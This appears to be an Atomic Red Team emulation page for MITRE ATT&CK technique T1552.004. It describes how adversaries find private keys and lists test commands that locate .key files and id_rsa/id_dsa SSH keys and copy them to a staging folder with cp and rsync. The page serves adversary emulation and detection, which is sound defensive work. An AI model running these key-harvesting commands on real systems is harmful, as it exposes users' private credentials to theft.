# T1552.004 - Unsecured Credentials: Private Keys
Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. 

Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.

Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)

Some private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Private Keys
Find private keys on the Windows file system.
File extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
dir c:\ /b /s .key | findstr /e .key
```

Invoke-AtomicTest T1552.004 -TestNumbers 1

### Atomic Test #2 - Discover Private SSH Keys
Discover private SSH keys on a macOS or Linux system.

**Supported Platforms:** macos, linux
#### Attack Commands: Run with `sh`
```sh
find #{search_path} -name id_rsa >> #{output_file}
find #{search_path} -name id_dsa >> #{output_file}
```

Invoke-AtomicTest T1552.004 -TestNumbers 2

### Atomic Test #3 - Copy Private SSH Keys with CP
Copy private SSH keys on a Linux system to a staging folder using the `cp` command.

**Supported Platforms:** linux
#### Attack Commands: Run with `sh`
```sh
mkdir #{output_folder}
find #{search_path} -name id_rsa -exec cp --parents {} #{output_folder} \;
find #{search_path} -name id_dsa -exec cp --parents {} #{output_folder} \;
```

Invoke-AtomicTest T1552.004 -TestNumbers 3

### Atomic Test #4 - Copy Private SSH Keys with rsync
Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.

**Supported Platforms:** macos, linux
#### Attack Commands: Run with `sh`
```sh
mkdir #{output_folder}
find #{search_path} -name id_rsa -exec rsync -R {} #{output_folder} \;
find #{search_path} -name id_dsa -exec rsync -R {} #{output_folder} \;
```

Invoke-AtomicTest T1552.004 -TestNumbers 4

## Detection
Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication.